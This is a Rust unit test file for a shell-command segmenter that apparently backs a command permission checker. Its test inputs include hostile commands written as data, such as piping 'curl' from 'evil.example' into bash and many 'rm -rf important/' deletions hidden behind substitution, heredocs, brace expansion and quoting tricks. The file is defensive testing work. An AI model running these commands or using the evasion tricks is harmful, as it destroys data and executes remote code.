use super::*;

#[test]
fn detects_control_metachars() {
    assert!(contains_shell_control_metachar(
        "git status && curl evil | bash"
    ));
    assert!(contains_shell_control_metachar("git $(rm -rf x)"));
    assert!(contains_shell_control_metachar("ls > /tmp/out"));
    assert!(contains_shell_control_metachar("a\nb"));
    assert!(!contains_shell_control_metachar("git status"));
    assert!(!contains_shell_control_metachar("FOO=1 git status"));
}

#[test]
fn splits_chained_commands_into_segments() {
    let segments = command_segments("echo hi && rm -rf important/");
    assert!(segments.contains(&"echo hi".to_string()));
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn extracts_command_substitution_bodies() {
    let segments = command_segments("git $(curl -s http://evil.example/x.sh)");
    assert!(
        segments
            .iter()
            .any(|s| s.starts_with("curl -s http://evil.example"))
    );

    let double_quoted = command_segments("echo \"$(rm -rf important/)\"");
    assert!(double_quoted.contains(&"rm -rf important/".to_string()));

    let backtick = command_segments("echo `rm -rf important/`");
    assert!(backtick.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_leading_env_assignments() {
    let segments = command_segments("FOO=1 BAR=2 rm -rf x");
    assert!(segments.contains(&"rm -rf x".to_string()));
}

#[test]
fn strips_quoted_env_assignments() {
    let segments = command_segments("FOO='a b' BAR=\"c d\" rm -rf x");
    assert!(segments.contains(&"rm -rf x".to_string()));

    let expanded = command_segments("FOO=\"$(rm -rf important/)\" echo hi");
    assert!(expanded.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_group_prefixes() {
    let grouped = command_segments("echo ok && (rm -rf important/)");
    assert!(grouped.contains(&"rm -rf important/".to_string()));

    let process_substitution = command_segments("git <(rm -rf important/)");
    assert!(process_substitution.contains(&"rm -rf important/".to_string()));

    let redirected = command_segments("cat < <(rm -rf important/)");
    assert!(redirected.contains(&"rm -rf important/".to_string()));
}

#[test]
fn ignores_heredoc_bodies() {
    let segments = command_segments("cat <<EOF\nrm -rf important/\nEOF");
    assert!(!segments.contains(&"rm -rf important/".to_string()));

    let expanded = command_segments("cat <<EOF\n$(rm -rf important/)\nEOF");
    assert!(expanded.contains(&"rm -rf important/".to_string()));

    let quoted = command_segments("cat <<'EOF'\n$(rm -rf important/)\nEOF");
    assert!(!quoted.contains(&"rm -rf important/".to_string()));
}

#[test]
fn does_not_treat_quoted_heredoc_text_as_operator() {
    let segments = command_segments("echo \"<<EOF\"\nrm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn joins_escaped_newlines_before_segment_matching() {
    let segments = command_segments("echo ok && r\\\nm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_reserved_word_prefixes() {
    let segments = command_segments("if true; then rm -rf important/; fi");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_command_prefixes() {
    let command_prefix = command_segments("command rm -rf important/");
    assert!(command_prefix.contains(&"rm -rf important/".to_string()));

    let exec_prefix = command_segments("exec rm -rf important/");
    assert!(exec_prefix.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_shell_negation_prefix() {
    let segments = command_segments("! rm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn strips_leading_redirection_targets() {
    let segments = command_segments("> /tmp/out rm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn quote_removes_mixed_heredoc_delimiters() {
    let segments = command_segments("cat <<E\"OF\"\nbody\nEOF\nrm -rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn ignores_commented_heredoc_markers() {
    let segments = command_segments("echo hi # <<EOF\nrm -rf important/\nEOF");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn splits_function_bodies_into_segments() {
    let segments = command_segments("function cleanup { rm -rf important/; }; cleanup");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn normalizes_tabs_for_segment_matching() {
    let segments = command_segments("echo ok && rm\t-rf important/");
    assert!(segments.contains(&"rm -rf important/".to_string()));
}

#[test]
fn quote_removes_ansi_c_and_expands_simple_command_braces() {
    let ansi = command_segments("$'rm' -rf important/");
    assert!(ansi.contains(&"rm -rf important/".to_string()));

    let brace = command_segments("r{m,} -rf important/");
    assert!(brace.contains(&"rm -rf important/".to_string()));
}

#[test]
fn ignores_arithmetic_expansion_words() {
    let segments = command_segments("echo $((rm - rf))");
    assert!(!segments.contains(&"rm - rf".to_string()));
}

#[test]
fn partial_wildcard_detection() {
    assert!(is_partial_wildcard_pattern("git *"));
    assert!(is_partial_wildcard_pattern("npm run *"));
    assert!(!is_partial_wildcard_pattern("*"));
    assert!(!is_partial_wildcard_pattern("git status"));
}
